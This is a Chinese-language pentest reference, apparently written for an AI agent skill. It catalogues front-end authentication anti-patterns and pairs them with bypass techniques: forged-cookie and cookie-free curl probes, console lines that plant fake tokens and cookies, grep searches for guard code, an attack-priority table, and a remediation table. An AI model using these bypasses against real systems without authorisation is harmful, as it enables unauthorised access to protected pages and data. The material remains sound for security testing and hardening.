# 5 类前端鉴权反模式识别

> 适用技能:route-guard-bypass
> 适用场景:静态扫描目标 JS bundle,定位鉴权机制类型 + 攻击面

---

## 反模式 1:guard.js 客户端化

**特征**:每个 HTML 页面 `<script src="js/guard.js"></script>`,guard() 函数检查 localStorage / cookie / token 后跳转 /login.html

**典型代码**:
```js
// guard.js (恺易智慧园区)
const userStore = {
  isLogin() {
    return (
      window.localStorage.getItem('login_status') === '200' &&
      location.pathname !== '/login.html' &&
      localStorage.getItem('user_info_bi')
    )
  }
}
const guard = () => {
  if (location.pathname === '/login.html') return
  if (!userStore.isLogin()) {
    alert('请先登录后在操作！')
    window.location.href = '/login.html'
  }
}
guard()  // 页面加载时自动执行
```

**攻击面**:
- ✅ HTML 文件可任意访问(无后端鉴权)
- ✅ API 端点零鉴权(后端不校验)
- ✅ localStorage 用户可控(任意修改)

**绕过方式**:
- MITM 替换 guard.js 为 noop 版本
- Console 注入 localStorage 后跳转
- 自包含 HTML 从同源访问

---

## 反模式 2:Vue router.beforeEach

**特征**:SPA 入口 main.js 中 `router.beforeEach((to, from, next) => { ... })`,客户端拦截路由跳转

**典型代码**:
```js
// main.js (Vue 2 SPA)
import router from './router'

router.beforeEach((to, from, next) => {
  const isLoggedIn = localStorage.getItem('token')
  if (to.matched.some(record => record.meta.requiresAuth)) {
    if (!isLoggedIn) {
      next({ path: '/login', query: { redirect: to.fullPath } })
    } else {
      next()
    }
  } else {
    next()
  }
})
```

**攻击面**:
- ✅ SPA 静态资源可任意访问(chunks/*.html)
- ✅ 路由懒加载 chunk 可任意访问(/static/js/chunk-xxx.js)
- ✅ 后端 API 零鉴权(常被忽视)

**绕过方式**:
- 直接访问 SPA 入口 index.html(无需路由)
- 直接访问 chunk JS 文件
- 直接调用后端 API(POST /api/xxx 无 cookie 也可能 200)

**特殊技巧**:
```js
// Vue 2 SPA 路由表提取
// 在 /static/js/app.js 或 /js/chunk-xxx.js 中搜索:
window._ROUTER_PATHS = [
  '/dashboard', '/admin', '/iot/device', '/iot/control',
  '/energy/monitor', '/machinery/list'
]
```

---

## 反模式 3:Express 中间件客户端化

**特征**:服务端中间件检查 req.session.user,但 cookie 可任意伪造

**典型代码**:
```js
// server.js
app.use((req, res, next) => {
  if (req.url.startsWith('/api/protected')) {
    if (!req.session.user) {
      return res.status(401).json({ error: 'Not logged in' })
    }
  }
  next()
})
```

**攻击面**:
- ✅ Cookie 可任意伪造(`Cookie: session=fake`)
- ✅ Session ID 可猜测(时间戳/UUID/顺序号)
- ✅ 客户端检查逻辑可绕过

**绕过方式**:
```bash
# 1. 任意 cookie 尝试
curl -X GET http://target/api/protected/endpoint -H "Cookie: session=anyvalue"
# 2. 无 cookie 尝试
curl -X GET http://target/api/protected/endpoint
# 3. 重复 cookie
curl -X GET http://target/api/protected/endpoint -H "Cookie: session=; session="
```

---

## 反模式 4:localStorage 检查

**特征**:JavaScript 读取 `localStorage.getItem('xxx')` 判断登录态,但**后端不校验**

**典型代码**:
```js
// 各种形式
const token = localStorage.getItem('token')
const isLoggedIn = localStorage.getItem('login_status') === '200'
const userInfo = JSON.parse(localStorage.getItem('user_info_bi'))
```

**关键字段名(实战高频)**:
- `token` / `auth_token` / `access_token`
- `login_status` / `isLoggedIn` / `auth`
- `user_info` / `user_info_bi` / `userInfo`
- `userId` / `user_id` / `uid`
- `role` / `permission` / `level`

**绕过方式**:任意用户可注入任意字段(浏览器本地存储)

---

## 反模式 5:Session cookie 客户端化

**特征**:token 存 document.cookie(无 HttpOnly 标记),JavaScript 可读可写,但**后端不校验**

**典型代码**:
```js
// 客户端写入 cookie
document.cookie = `token=${resp.token}; path=/`
// 客户端读取 cookie
const token = document.cookie.split('; ').find(c => c.startsWith('token='))
```

**攻击面**:
- ✅ JavaScript 可读写 cookie(XSS 直接盗取)
- ✅ 客户端可任意 setCookie
- ⚠️ HttpOnly 标记缺失 → 即使无 XSS 也可读

**绕过方式**:
```js
// 直接 setCookie
document.cookie = "token=fake; path=/"
document.cookie = "session_id=fake; path=/"
// 然后跳转
location.href = '/admin'
```

---

## 反模式识别 SOP

### Step 1:静态代码搜索

```bash
# 1.1 guard.js 探测
find . -name "guard.js" -o -name "auth.js" -o -name "interceptor.js" -o -name "authGuard.js" 2>/dev/null

# 1.2 关键字搜索
grep -rnE "(isLogin|isLoggedIn|isAuth|checkAuth|requiresAuth|guard\(|router\.beforeEach)" *.js

# 1.3 localStorage 关键字
grep -rnE "localStorage\.(get|set)Item" *.js | head -30

# 1.4 cookie 关键字
grep -rnE "document\.cookie" *.js | head -30

# 1.5 鉴权跳转
grep -rnE "(location\.href|next\()\s*[\(=]\s*['\"][^'\"]*login" *.js
```

### Step 2:动态验证(浏览器)

```js
// 浏览器 Console(F12)
localStorage.clear()  // 清空
// 访问任意已登录页面 → 看是否被拦截(若被拦截 = 反模式 1 或 2)
```

### Step 3:HTTP 探针

```bash
# 3.1 任意访问 HTML 路由
curl -sI http://target/index_device.html
# 返回 200 OK = HTML 可任意访问
# 返回 302 → /login.html = 服务端重定向(非反模式)

# 3.2 任意访问 API
curl -X POST http://target/BI/xxx -H "Content-Type: application/json" -d '{}'
# 返回 200 + 数据 = API 零鉴权
# 返回 401 = API 鉴权
```

---

## 5 类反模式攻击优先级

| 反模式 | 优先级 | 危害 | 绕过难度 |
|---|---|---|---|
| **guard.js 客户端化** | 🔴 P0 | 全 HTML + 全 API 暴露 | 🟢 极低(1 行 JS) |
| **Vue beforeEach** | 🟠 P0 | 全 SPA 路由 + 全 API 暴露 | 🟢 极低(直接访问入口) |
| **Express 中间件客户端化** | 🟡 P1 | 全 API 可绕过 | 🟡 中(需猜测 session ID) |
| **localStorage 检查** | 🔴 P0 | 全 HTML + 全 API 暴露 | 🟢 极低(1 行 JS) |
| **Session cookie 客户端化** | 🟠 P0 | Cookie 可伪造 + XSS 风险 | 🟢 极低(setCookie) |

---

## 类似反模式(扩展)

### 反模式 6:JWT 客户端存储

```js
// JWT 存 localStorage
localStorage.setItem('jwt', token)
// 但后端 HS256 签名校验严格 → 难以伪造
// ⚠️ 但若后端不校验签名 / 弱密钥 → 可绕过
```

### 反模式 7:WebSocket 客户端鉴权

```js
// WebSocket 连接时不带 token
const ws = new WebSocket('ws://target/realtime')
// 服务端不校验 origin / token → 可连接
// ⚠️ 危害:实时数据流可被订阅
```

### 反模式 8:SSE / EventSource 客户端鉴权

```js
// SSE 连接无 token
const sse = new EventSource('/api/realtime/data')
// 服务端不校验 → 可订阅实时数据
```

### 反模式 9:前端路由 hash 模式

```js
// Vue hash 路由
new VueRouter({ mode: 'hash' })
// URL: /#/admin /#/iot/device
// 服务端只看到 / → 路由由前端解析
// ✅ 服务端完全无法鉴权
```

### 反模式 10:前端路由 history 模式 + 无后端兜底

```js
// Vue history 路由
new VueRouter({ mode: 'history' })
// 但服务端没有 catch-all 路由 → 直接访问 /admin 返回 404
// 或返回 index.html → 客户端解析路由 → 跳过鉴权
```

---

## 修复方案对照表

| 反模式 | 修复 |
|---|---|
| guard.js 客户端化 | 删除前端守卫 + 后端 Session 校验 + Nginx 反代 |
| Vue beforeEach | 同上 + Vue Router meta 标记仅作 UI 提示 |
| Express 中间件客户端化 | 服务端中间件严格校验 + cookie HttpOnly + SameSite=Strict |
| localStorage 检查 | 改用 Session Cookie(HttpOnly + Secure) |
| Session cookie 客户端化 | 标记 HttpOnly + 后端严格校验签名 |
| JWT 客户端存储 | 改用 HttpOnly Cookie 存储 JWT + 后端 RS256 严格校验 |
| WebSocket 客户端鉴权 | 服务端校验 token + 检查 Origin 头 |
| SSE 客户端鉴权 | 服务端校验 token + 检查 Referer/Origin |
| 前端 hash 路由 | 强制 history 模式 + 服务端 catch-all + 后端鉴权 |
| history 无后端兜底 | Nginx try_files + 后端 Session 校验 |

---

## 实战识别流程(总结)

```
[Step 1] 抓主入口 JS
   ↓
[Step 2] grep 鉴权关键字(isLogin/beforeEach/localStorage/cookie)
   ↓
[Step 3] 读取 guard.js / auth.js / interceptor.js 内容
   ↓
[Step 4] HTTP 探针 HTML 路由(200 OK = 可绕过)
   ↓
[Step 5] HTTP 探针 API 端点(200 OK + 数据 = 零鉴权)
   ↓
[Step 6] 选 EXP 方案(MITM/Console/HTML)
   ↓
[Step 7] js-reverse-mcp 截图取证
```